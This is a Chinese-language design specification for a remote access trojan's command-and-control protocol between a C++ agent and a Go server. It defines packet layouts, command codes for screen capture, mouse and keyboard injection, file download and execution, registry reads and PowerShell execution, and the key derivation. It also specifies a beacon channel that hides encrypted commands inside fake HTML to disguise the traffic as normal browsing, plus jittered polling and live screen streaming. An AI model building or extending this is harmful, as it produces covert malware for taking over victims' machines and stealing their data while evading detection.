# C2 协议规范 v1

本文档是 C++ 客户端与 Go 服务端之间的**唯一通信契约**。两端各自独立实现本规范，
字节布局一律以本文为准（网络字节序统一 **little-endian**）。

- 传输：TCP（默认端口 4444）
- 加密：AES-256-GCM（payload 加密，头部明文）
- 密钥：预共享密钥 PSK → HKDF-SHA256 派生会话密钥（见 §4）

---

## 1. 数据包结构

所有消息（Agent↔C2、CLI↔C2）使用同一数据包：

```
偏移  字段        类型   字节  说明
0     magic       u16    2     固定 0x5A5A
2     version     u8     1     协议版本（当前 1）
3     flags       u8     1     bit0=payload 已加密(1)；bit1=压缩(预留)
4     seq         u32    4     序列号（请求/响应关联）
8     timestamp   u32    4     发送方时间戳 ms（GetTickCount / time.Now().UnixMilli）
12    cmd         u16    2     指令码（§3）
14    plugin      u8     1     插件 ID（0=core，1=remote，2=file，3=sys，0xFF=管理）
15    status      u8     1     状态码（§2，响应用）
16    payload_len u32    4     payload 字节数（0 ≤ len ≤ 16 MiB）
20    payload     bytes  len   密文段（flags.bit0=1 时：nonce(12) + ciphertext + tag(16)）
```

**固定头部 20 字节**（不含 payload）。

### 1.1 C 结构体定义（参考实现）

```c
#pragma pack(push, 1)
typedef struct {
    uint16_t magic;      // 0x5A5A
    uint8_t  version;    // 1
    uint8_t  flags;      // bit0: encrypted
    uint32_t seq;
    uint32_t timestamp;
    uint16_t cmd;
    uint8_t  plugin;
    uint8_t  status;
    uint32_t payload_len;
    // uint8_t payload[payload_len];
} rat_packet_hdr;        // 20 bytes
#pragma pack(pop)
```

### 1.2 分帧规则（接收端）

1. 读固定 20 字节头部；
2. 校验 `magic == 0x5A5A`、`version == 1`、`payload_len <= 16 MiB`（否则丢弃并计数）；
3. 按 `payload_len` 读取剩余字节；
4. 若 `flags.bit0=1`：`payload = nonce(12) + ciphertext + tag(16)`，
   用会话密钥 AES-256-GCM 解密；**tag 校验失败即丢包**（完整性由 GCM 保证）。
5. 头部明文传输（C2 无需解密即可按 `plugin`/`cmd`/`seq` 路由）。

---

## 2. 状态码

| 值 | 含义 |
|---|---|
| 0 | OK |
| 1 | 未实现 / 未知指令 |
| 2 | 参数错误 |
| 3 | 权限不足 |
| 4 | 目标不存在（文件/进程等） |
| 5 | 超时 |
| 6 | 会话不存在（agent 离线） |
| 0x80+ | 插件自定义错误 |

---

## 3. 指令码表

指令码高 4 位 = 模块段：`0x0` 核心、`0x1` 远程控制、`0x2` 文件、`0x3` 系统、`0x4` 管理。

### 3.1 核心段（plugin=0，core 处理）

| 指令码 | 名称 | 方向 | payload（明文） | 响应 |
|---|---|---|---|---|
| 0x0101 | CMD_HELLO | Agent/CLI→C2 | 见 §5.1 | 见 §5.2 |
| 0x0103 | CMD_HEARTBEAT | Agent→C2 | agent_id(16B) + 插件位图(u32) + CPU%(u8) + 内存%(u8) | —（不回，靠收包刷新活跃） |
| 0x0104 | CMD_RESULT | Agent→C2→CLI | req_seq(u32) + status(u8) + 结果 | — |
| 0x0105 | CMD_EVENT | Agent→C2→CLI | 事件类型(u8) + 数据 | — |
| 0x0106 | CMD_BYE | 任意→C2 | 原因(u8) | — |

### 3.2 业务段（CLI→C2→Agent，C2 透明转发，不解密 payload）

| 指令码 | 名称 | plugin | payload 首 16B | 说明 |
|---|---|---|---|---|
| 0x1001 | RMT_SCREENSHOT | 1 | agent_id | 响应：PNG/JPEG |
| 0x1002 | RMT_SCREEN_STREAM | 1 | agent_id + 控制(u8) + fps(u8) + quality(u8) + scale%(u8) | 帧走专用长连接（§9） |
| 0x1003 | RMT_MOUSE_MOVE | 1 | agent_id + x(i32)+y(i32) | |
| 0x1004 | RMT_MOUSE_CLICK | 1 | agent_id + 按键(u8)+按下/释放(u8) | |
| 0x1006 | RMT_KEY | 1 | agent_id + vk(u8)+按下/释放(u8) | |
| 0x2001 | FILE_LIST | 2 | agent_id + 路径 | 响应：条目数组 |
| 0x2002 | FILE_DOWNLOAD | 2 | agent_id + 远程路径 | 响应：分块数据 |
| 0x2003 | FILE_UPLOAD | 2 | agent_id + 块号+路径+数据+末块 | |
| 0x2004 | FILE_DELETE | 2 | agent_id + 路径 | |
| 0x2005 | FILE_RENAME | 2 | agent_id + 旧路径+新路径 | |
| 0x2006 | FILE_EXECUTE | 2 | agent_id + 路径+参数 | 响应：pid |
| 0x3001 | SYS_INFO | 3 | agent_id | 响应：系统信息（文本） |
| 0x3002 | SYS_PROC_LIST | 3 | agent_id | 响应：进程数组 |
| 0x3003 | SYS_PROC_KILL | 3 | agent_id + pid(u32) | |
| 0x3004 | SYS_SVC_LIST | 3 | agent_id | 响应：服务数组 |
| 0x3006 | SYS_REG_READ | 3 | agent_id + 键路径+值名 | 响应：类型+值 |
| 0x3008 | SYS_EXEC_PS | 3 | agent_id + PowerShell 命令(UTF-8) | 响应：命令输出文本 |

> 业务指令（0x1xxx/0x2xxx/0x3xxx）流转：CLI 发出（payload 首 16B 为目标 `agent_id`）→
> C2 按 agent_id 查会话并**透明转发**给对应 Agent（不解密、不改 payload，仅换头部 seq 为
> C2 侧递增的转发序号）→ Agent 执行后回 `CMD_RESULT`（header.seq = 转发序号，payload =
> req_seq+status+结果）→ C2 按 `(agent_id, 转发序号)` 映射回传给发起请求的 CLI
> （header.seq 还原为 CLI 请求的 seq）。多 CLI 并存时按连接区分映射，互不干扰。
>
> 当前已实现：`SYS_INFO`（系统信息）、`SYS_EXEC_PS`（PowerShell 执行）；其余业务码 M3 插件化时启用。

### 3.3 管理段（plugin=0xFF，仅 CLI↔C2，C2 本地处理不转发）

| 指令码 | 名称 | 方向 | payload | 响应 |
|---|---|---|---|---|
| 0x4001 | CTL_LIST | CLI→C2 | 空 | 会话数组（见 §5.3） |
| 0x4002 | CTL_KILL_SESSION | CLI→C2 | agent_id(16B) | status |
| 0x4003 | CTL_GET_SESSION | CLI→C2 | agent_id(16B) | 单会话详情 |

---

## 4. 加密方案（AES-256-GCM）

- **PSK**：32 字节，部署时写入两端配置（Agent 可编译期内置）。
- **握手派生**：
  1. 客户端生成 16B 随机 `client_nonce`，随 CMD_HELLO 明文发送；
  2. C2 生成 16B 随机 `server_nonce`，随 CMD_HELLO_ACK 明文发送；
  3. `session_key = HKDF-SHA256(ikm=PSK, salt=client_nonce||server_nonce, info="rat-v1", 32B)`；
  4. 此后所有 payload 用 `session_key` 加密（HELLO/ACK 自身明文，便于协商）。
- **每包**：`nonce` = 12B 随机（每次加密生成）；密文段 = `nonce + AES-256-GCM(key, nonce, plaintext)`（GCM 自带 16B tag）；`flags.bit0=1`。
- HKDF 需依赖 `golang.org/x/crypto/hkdf`（Go）与 Windows BCrypt（C++）。

### 4.1 防重放（seq 严格递增校验）

除 GCM 认证外，接收端对**每个连接**维护 `last_seq`（已处理的最大请求序号）：

- 新包要求 `header.seq > last_seq`，否则视为重放/乱序，**丢弃并计数告警**；
- 依赖 TCP 按序交付（乱序到达不会发生），因此"严格递增"是安全的；
- 校验在解密之后、处理之前执行；握手包（HELLO/ACK）不参与（协商阶段）；
- 每连接独立维护（重连后 seq 重新从 0 起），两端（Agent 与 C2）都执行。

---

## 5. 会话与握手负载定义

### 5.1 CMD_HELLO payload（明文，未加密）

```
版本协商字段（按 C 结构打包）：
  magic_version  u32   协议版本 << 16 | 兼容版本（M1 用 1<<16|1）
  role           u8    0=AGENT, 1=CONTROL
  agent_id       bytes 16B（AGENT 必填：随机生成，保持跨重连稳定；CONTROL 填 0）
  client_nonce   bytes 16B
  附加（AGENT）：
    plugins_bitmap u32  插件位图（bit i = plugin_id i 已加载）
    os_info        u8[] UTF-8 字符串（如 "Windows 10 22H2"）
```

### 5.2 CMD_HELLO_ACK payload（明文）

```
  accept        u8    0=接受，非 0=拒绝原因
  server_nonce  bytes 16B（接受时）
  server_time   u64   Unix ms
```

### 5.3 CTL_LIST 响应 payload（明文）

```
  count   u32  会话数
  每个会话：
    agent_id      16B
    ip            u32（网络序）
    port          u16
    os_info       字符串（u16 长度前缀 + UTF-8）
    plugins        u32 位图
    last_seen_ms  u64 最后活跃时间戳
    online         u8  1=在线（30s 内有心跳），0=离线
```

---

## 6. 心跳与会话生命周期

| 参数 | 值 |
|---|---|
| 心跳周期 | 15s（Agent 发送 CMD_HEARTBEAT） |
| 离线判定 | 30s 未收到任何包 → 标记 offline |
| 会话回收 | 离线 > 60s → 关闭连接、删除会话 |
| 断线重连 | Agent 指数退避 1s→2s→…→60s 上限，重连后重新 HELLO（seq 从 0 起） |

> 注意：以上为 **ctl 信道 / 直连模型** 的会话维护参数。Agent 切换为 HTTP 轮询信道（§8）后，
> 心跳语义由"Agent 定时 GET"取代，离线判定按轮询周期计算（见 §8.6）。

---

## 8. Beacon 信道（Agent HTTP 轮询）

Agent 与 C2 之间的流量**收敛为周期性 HTTP 请求**（无 TCP 长连接、无突发流量），
使流量伪装成正常网页浏览。**ctl 信道（TCP 4444）保持不变**。

### 8.1 轮询模型

```
Agent                     c2server (HTTP :8080)
  │ ① 若有待上传结果: POST /submit (form: data=base64)
  ├─────────────────────────────────────────▶│  解密结果 → 存队列 → 推给 ctl
  │ ② GET /（Cookie: SID=agent_id_hex）       │
  ├─────────────────────────────────────────▶│  取命令队列 → 加密 → 伪装 HTML
  │◀────────────────── 200 text/html ────────┤  <div id="token">base64(密文)</div>
  │ ③ 解密 → 逐条执行 → 结果暂存本地           │
  │ ④ Sleep(sleeptime ± jitter) → 回到 ①      │
```

- 一个轮询周期内：**先 POST 上传上次结果，再 GET 取新命令**；
- 每轮最多一次 GET + 一次 POST，除此之外无任何连接；
- GET 本身即"心跳"：服务器以最近一次 GET 时间刷新会话活跃。

### 8.2 Beacon 密钥（无状态派生，无需握手）

```
beacon_key = HKDF-SHA256(ikm=PSK, salt=agent_id(16B), info="rat-beacon-v1", 32B)
```

- 服务器从 Cookie 中的 agent_id 即可**重算**密钥，无需保存、无需握手/nonce 交换；
- Agent 本地也无需持久化密钥；
- 与 ctl 信道的会话密钥（§4）相互独立，互不影响。

### 8.3 Agent 身份传递

- 每次请求携带 `Cookie: SID=<agent_id_hex>`（32 个小写十六进制）；
- 服务器首次见到该 ID 即注册会话（OS 信息从 Cookie 附加 `OS=` 读取，可选）。

### 8.4 命令下发（GET 响应）

- 响应：`Content-Type: text/html`，正文为一段正常 HTML（伪装网页）；
- 命令载体：`<div id="token">BASE64</div>`；无命令时该 div 为空或省略；
- `BASE64` 解码后为 `beacon_key` AES-256-GCM 加密的命令块（nonce+ct+tag）；
- 命令块明文为 TLV（小端）：

```
count   u32   命令条数
每条：
  seq     u32   命令序号（结果按它回传）
  cmd     u16   指令码（0x3001/0x3008…）
  len     u32   payload 字节数
  payload bytes 业务参数（不含 agent_id 前缀）
```

### 8.5 结果上传（POST /submit）

- 请求：`Content-Type: application/x-www-form-urlencoded`，body `data=<BASE64>`；
- `BASE64` 解码后为 `beacon_key` 加密的结果块；
- 结果块明文为 TLV（小端）：

```
count   u32   结果条数
每条：
  seq     u32   对应命令的 seq
  status  u8    状态码（§2）
  len     u32   result 字节数
  result  bytes 结果文本
```

- 服务器解密后：按 `(agent_id, seq)` 关联 relay，若存在发起该命令的 ctl 连接则推
  `CMD_RESULT`（seq 还原为 ctl 请求 seq）；否则暂存待 ctl 查询。

### 8.6 轮询参数与会话维护

| 参数 | 值 |
|---|---|
| sleeptime | Agent 默认 60s（启动参数 `-s <秒>` 可调） |
| jitter | ±20%（实际休眠 = sleeptime × (1 + rand(-0.2, +0.2))） |
| 离线判定 | 3 × sleeptime 未收到 GET → 标记 offline；6 × sleeptime → 回收 |
| 超时（网络请求） | 每轮 GET/POST 内部超时 15s（失败不退出，继续休眠重试） |

---

## 7. 测试向量（两端交叉验证）

> 生成：见 `server/internal/protocol/testdata`（Go 生成，固定输入）。
> 两端对同一向量必须产生相同结果：`crypto_test.go`（Go）与 `protocol_test.cpp`（C++）共用。

（M1 生成后填充：固定 PSK / client_nonce / server_nonce → session_key；固定 key/nonce/明文 → 密文。）

---

## 9. 屏幕流长连接（实时屏幕查看 + 输入回放）

仅支持**长连接模式**：Agent 收到 `RMT_SCREEN_STREAM`(0x1002, beacon 信道) 后，主动
外连 c2server **TCP 4445** 建立专用长连接；屏幕帧上行、输入事件下行都走此连接
（不经 60s 轮询）。停止命令到达后 Agent 断开该连接。

### 9.1 连接握手（明文，第 1-2 个包）

```
Agent ──CmdStreamHello(0x0501)──▶ C2    payload: agent_id(16) + client_nonce(16)
C2   ──CmdStreamAck (0x0502)──▶ Agent  payload: server_nonce(16)
```

- 双方派生 `stream_key = HKDF-SHA256(ikm=PSK, salt=agent_id||client_nonce||server_nonce,
  info="rat-stream-v1", 32B)`；
- 认证：连接声称某 agent_id，但后续帧/事件都用 stream_key 加密——无密钥者无法通过
  第一个解密校验，服务器解密失败即断开（防冒名）；
- 服务器按 agent_id 登记该屏幕连接（同一 agent 重复连接踢旧）。

### 9.2 抓屏缩放（scale）与输入坐标一致性

`RMT_SCREEN_STREAM` 的 `scale%` 控制 Agent 抓屏缩放（100=全分辨率，50=半分辨率）：
- Agent 侧 `ScreenSpy` 按 scale 缩放抓屏（帧尺寸 = 屏幕尺寸 × scale），省带宽；
- **输入坐标换算基准必须同步**：注入时的像素基准 = 真实分辨率 × scale
  （`set_input_scale`），否则键鼠只能覆盖屏幕的一部分（如 scale=0.5 时只覆盖左上 1/4）；
- ctl 侧无需缩放处理：帧头携带的 w/h 即缩放后尺寸，坐标映射（本地屏幕→帧坐标）自动适配。

### 9.2 帧上行（Agent→C2→ctl）

`CmdScreenFrame(0x0503)`，payload 用 stream_key AES-GCM 加密：

```
seq      u32  帧序号
w        u16  宽
h        u16  高
jpeg_len u32  JPEG 字节数
jpeg     bytes WIC 编码的 JPEG 帧
```

- C2 中转到发起屏幕流的 ctl 连接：**转换加密**（stream_key 解密 → 用 ctl 连接密钥
  重新加密 → 以同一 cmd=0x0503 转发给 ctl）；
- ctl 用 stb_image 解码 JPEG → OpenGL 纹理显示。

### 9.3 输入下行（ctl→C2→Agent）

`CmdInputEvents(0x0504)`，payload 用各自连接密钥加密：

```
count u32  事件条数
每条 InputEvent(24B)：seq(4) + msg(4) + vk(4) + wheel(2) + flags(2) + x(4) + y(4)
```

- msg 为 WM_* 消息（鼠标：0x200-0x20A；键盘：0x100/0x101/0x104/0x105），
  x/y 为像素坐标（与 Agent 抓屏坐标系一致）；
- C2 同样转换加密后转发给对应 Agent 屏幕连接；Agent 用 SendInput 注入。

### 9.4 生命周期

| 事件 | 行为 |
|---|---|
| 开始(0x1002 control=1) | beacon 入队 → Agent 建立 4445 连接 |
| 停止(control=0) | beacon 入队 → Agent 断开 4445 连接；C2 清理配对 |
| Agent 屏幕连接断开 | C2 通知 ctl（CMD_RESULT status=连接断开） |
